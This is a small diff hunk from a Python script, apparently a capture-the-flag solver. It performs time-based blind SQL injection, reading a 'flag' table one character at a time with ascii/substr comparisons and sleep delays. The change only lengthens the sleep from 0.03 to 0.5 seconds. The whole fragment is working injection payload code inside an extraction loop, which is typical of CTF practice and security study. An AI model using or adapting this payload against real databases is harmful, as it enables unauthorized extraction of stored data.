@@ -27,7 +27,7 @@ for i in range(1, 35):
         
         # 爆值
         payload = {
-            'id': f"if(ascii(substr((select group_concat(flag) from flag),{i},1))<{j},sleep(0.03),1)#"
+            'id': f"if(ascii(substr((select group_concat(flag) from flag),{i},1))<{j},sleep(0.5),1)#"
         }
         
         start_time = time.time()
